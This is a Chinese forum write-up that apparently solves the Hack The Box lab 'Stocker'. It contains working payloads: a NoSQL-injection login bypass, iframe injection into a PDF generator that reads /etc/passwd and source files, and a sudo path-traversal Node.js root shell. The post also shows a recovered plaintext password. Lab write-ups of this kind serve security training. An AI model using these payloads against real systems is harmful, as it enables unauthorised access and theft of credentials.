
# [原创]HTB Stocker (easy)

上来还是信息收集，扫端口扫域名，扫目录：

```
sudo nmap -sS -sV -sC 10.10.11.196
```

![图片描述](upload/attach/202301/865065_A2FQDZYN8GWDAAY.png)

第一次扫描发现状态码 301 的很多，过滤下。这里的过滤不是太会用，好像老版本的 `ffuf` 有过滤参数，有大佬会教下。

```
ffuf -w wordlist/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u http://stocker.htb -H "Host:FUZZ.stocker.htb" -fs 169 -mc 200,204,302,307,401,403,404,405,500
```

![图片描述](upload/attach/202301/865065_5FRTTNVRMRJEYK7.png)

`dirsearch -u <mark class="encrypted">f01K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4@1L8$3y4C8k6i4u0Q4x3X3g2Z5N6r3u0Q4x3V1j5`.</mark>`

![图片描述](upload/attach/202301/865065_4UGE56DDEAVPZ5U.png)

再扫一下 `dev` 下的：

`dirsearch -u <mark class="encrypted">30aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3c8W2N6W2)9J5k6i4y4@1L8$3y4C8k6i4u0Q4x3X3g2Z5N6r3u0Q4x3V1j5`.</mark>`

![图片描述](upload/attach/202301/865065_WK5VYM78TMFWXSD.png)

访问`<mark class="encrypted">e33K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3c8W2N6W2)9J5k6i4y4@1L8$3y4C8k6i4u0Q4x3X3g2Z5N6r3u0Q4x3V1k6D9L8$3N6A6L8W2!0q4y4#2)9&6z5g2!0n7b7W2!0q4z5g2)9&6z5g2)9^5y4W2!0q4z5g2!0m8x3g2!0n7y4g2!0q4z5g2)9&6c8q4!0m8x3R3`.`.</mark>`

我们需要身份认证绕过，在这个网址里可以看到相关知识：

`<mark class="encrypted">733K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8$3!0C8i4K6u0W2K9r3q4U0K9%4c8J5K9h3y4C8M7#2)9J5k6i4S2&6P5W2)9J5c8Y4m8W2L8Y4c8W2M7%4c8A6L8X3N6Q4x3X3c8%4k6h3u0Q4x3V1k6F1L8%4y4I4L8q4)9J5k6r3W2F1K9X3g2U0N6r3W2G2L8W2)9J5x3$3u0S2M7$3W2U0i4K6u0V1j5i4g2@1K9r3g2F1N6r3W2U0j5i4c8A6L8$3&6Q4x3X3c8T1P5i4m8S2M7%4x3`.</mark>`

![图片描述](upload/attach/202301/865065_MPYCRQV5TBTSUS8.png)

```
Content-Type: application/json
{"username": {"$ne": null}, "password": {"$ne": null} }
```

完成登陆绕过，到 `/stock` 页面。

![图片描述](upload/attach/202301/865065_Z3YVK6TY8MXZPEP.png)

网站是个购物网站，将物品添加到购物车然后结账。

![图片描述](upload/attach/202301/865065_BKCAYHQP4RFZYF7.png)

![图片描述](upload/attach/202301/865065_R8WNHTPBZEEGQ7Q.png)

点击结算页面的 `here` 后获得到一个 pdf 形式的账单。

![图片描述](upload/attach/202301/865065_UDJD9S6GTX5MNQQ.png)

![图片描述](upload/attach/202301/865065_CGFNUJRZTSS92N5.png)

`title` 反馈在 pdf 中，`orderId` 反馈到 url。

尝试在 `title` 处尝试 xss：

`"title":"<iframe src=file:///etc/passwd></iframe>"`

相关知识：`<mark class="encrypted">3adK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8$3!0C8i4K6u0W2K9r3q4U0K9%4c8J5K9h3y4C8M7#2)9J5k6i4S2&6P5W2)9J5c8Y4m8W2L8Y4c8W2M7%4c8A6L8X3N6Q4x3X3c8%4k6h3u0Q4x3V1k6^5M7%4y4Q4x3X3c8U0M7X3!0K6M7#2)9J5k6s2y4A6N6r3g2Q4x3X3c8K6j5%4u0A6M7s2c8A6L8X3N6Q4x3V1k6K6k6i4u0$3k6i4u0Q4x3X3c8K6K9h3c8W2i4K6u0V1P5s2y4K6i4K6u0V1k6s2W2F1j5h3#2A6j5#2)9J5k6s2m8V1k6R3`.`.</mark>`

![图片描述](upload/attach/202301/865065_EMBWZPC8SFATANE.png)

修改下宽高：

```
"title":"<iframe src=file:///etc/passwd height=750px width=750px></iframe>",
```

![图片描述](upload/attach/202301/865065_X3HBM2DEY8BGQVY.png)

找到一个 `angoose` 用户。

![图片描述](upload/attach/202301/865065_U47NRZZ2PS857PT.png)

使用插件可以看出网站使用的 `node.js`。

尝试读下 `js` 文件：

`"<iframe src=file:///var/www/dev/index.js height=750px width=750px></iframe>"`

![图片描述](upload/attach/202301/865065_UVPD4ZTCFM6K29C.png)

获得密码 `IHeardPassphrasesArePrettySecure`。

尝试登录 `angoose:IHeardPassphasesArePrettySecure`。

![图片描述](upload/attach/202301/865065_G8SEUTFJF66VQAE.png)

`sudo -l` 发现指定目录下的 `js` 文件都能以 `root` 权限运行。

![图片描述](upload/attach/202301/865065_B6W7DQVKK6GNBRB.png)

```
cat > shell.js
const fs = require("child_process").spawn("/usr/bin/bash", {stdio:[0, 1, 2]})
```

写一个 `shell` 使用目录遍历执行它：

```
sudo node /usr/local/scripts/../../../home/angoose/shell.js
```

![图片描述](upload/attach/202301/865065_PZ3ZVJ7HCY2CJHN.png)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
